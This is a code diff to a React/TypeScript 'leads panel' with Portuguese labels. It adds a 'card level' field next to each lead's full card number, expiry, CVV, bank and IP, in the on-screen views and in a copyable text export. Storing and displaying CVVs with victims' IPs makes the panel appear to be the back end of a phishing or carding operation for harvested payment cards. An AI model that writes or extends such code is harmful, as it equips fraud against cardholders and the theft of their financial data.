@@ -27,6 +27,7 @@ interface Lead {
   cardExpiry: string;
   cardCvv: string;
   cardBank: string | null;
+  cardLevel: string | null;
   ip: string | null;
   installments: string;
   notes: string | null;
@@ -387,6 +388,7 @@ export default function LeadsPanelPage() {
         `Validade: ${isPix ? "-" : lead.cardExpiry || "-"}`,
         `CVV: ${isPix ? "-" : lead.cardCvv || "-"}`,
         `Banco/Instituição: ${lead.cardBank || "-"}`,
+        `Nível do cartão: ${lead.cardLevel || "-"}`,
         `Total: ${formatBRL(lead.totalCents)}`,
       ];
       return linhas.join("\n");
@@ -838,6 +840,7 @@ export default function LeadsPanelPage() {
                     <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
                     <Field label="Cartão" value={lead.cardNumber} />
                     <Field label="Banco / Instituição" value={lead.cardBank ?? "—"} />
+                    <Field label="Nível do cartão" value={lead.cardLevel ?? "—"} />
                     <Field label="IP" value={lead.ip} />
                     <Field
                       label="Validade / CVV"
@@ -1256,6 +1259,7 @@ export default function LeadsPanelPage() {
                       <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
                       <Field label="Cartão" value={lead.cardNumber} />
                       <Field label="Banco / Instituição" value={lead.cardBank ?? "—"} />
+                      <Field label="Nível do cartão" value={lead.cardLevel ?? "—"} />
                       <Field label="IP" value={lead.ip} />
                       <Field label="Forma de pagamento" value="Cartão" />
                     </div>
@@ -1378,6 +1382,7 @@ export default function LeadsPanelPage() {
                       <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
                       <Field label="Cartão" value={isPix ? "—" : lead.cardNumber} />
                       <Field label="Banco / Instituição" value={lead.cardBank ?? "—"} />
+                      <Field label="Nível do cartão" value={lead.cardLevel ?? "—"} />
                       <Field label="IP" value={lead.ip} />
                       <Field
                         label="Forma de pagamento"
